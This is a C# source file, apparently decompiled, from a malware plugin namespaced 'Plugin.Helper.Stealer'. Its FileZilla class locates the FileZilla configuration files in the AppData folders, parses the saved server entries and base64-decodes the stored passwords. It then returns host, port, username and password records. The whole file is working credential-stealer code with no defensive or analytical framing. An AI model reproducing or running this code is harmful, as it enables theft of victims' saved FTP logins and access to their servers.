

using InvokedCommon.Structs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;


namespace Plugin.Helper.Stealer
{
	public static class FileZilla
	{
		private static string[] possiblePaths;

		static FileZilla()
		{
			string[] strArray1 = new string[3]
			{
				"sitemanager.xml",
				"recentservers.xml",
				"filezilla.xml"
			};
			string[] strArray2 = new string[3]
			{
				Configuration.localAppData,
				Configuration.roamingAppData,
				Configuration.commonAppdata
			};
			FileZilla.possiblePaths = new string[strArray1.Length * strArray2.Length];
			for (int index1 = 0; index1 < strArray2.Length; ++index1)
			{
				for (int index2 = 0; index2 < strArray1.Length; ++index2)
					FileZilla.possiblePaths[index1 * strArray1.Length + index2] = Path.Combine(strArray2[index1], nameof (FileZilla), strArray1[index2]);
			}
		}

		public static FileZillaInfo[] GetInfo()
		{
			List<FileZillaInfo> fileZillaInfoList = new List<FileZillaInfo>();
			foreach (string possiblePath in FileZilla.possiblePaths)
			{
				if (File.Exists(possiblePath))
				{
					string xml = Utils.ForceReadFileString(possiblePath);
					if (xml != null)
					{
						XmlDocument xmlDocument = new XmlDocument();
						try
						{
							xmlDocument.LoadXml(xml);
						}
						catch
						{
							continue;
						}
						foreach (XmlNode xmlNode1 in xmlDocument.GetElementsByTagName("Server"))
						{
							if (xmlNode1.HasChildNodes)
							{
								string _host = (string) null;
								int result = int.MaxValue;
								string _username = (string) null;
								string _password = (string) null;
								foreach (XmlNode childNode in xmlNode1.ChildNodes)
								{
									if (childNode.Name == "Host")
										_host = childNode.InnerText;
									else if (childNode.Name == "Port")
										int.TryParse(childNode.InnerText, out result);
									else if (childNode.Name == "User")
										_username = childNode.InnerText;
									else if (childNode.Name == "Pass")
									{
										XmlNode xmlNode2 = childNode.Attributes.Item(0);
										if (xmlNode2 != null && !(xmlNode2.Name != "encoding"))
										{
											if (!(xmlNode2.Value != "base64"))
											{
												try
												{
													_password = Encoding.UTF8.GetString(Convert.FromBase64String(childNode.InnerText));
												}
												catch
												{
												}
											}
										}
									}
								}
								if (_host != null && result < (int) short.MaxValue && _username != null && _password != null)
									fileZillaInfoList.Add(new FileZillaInfo(_host, result, _username, _password));
							}
						}
					}
				}
			}
			return fileZillaInfoList.ToArray();
		}
	}
}
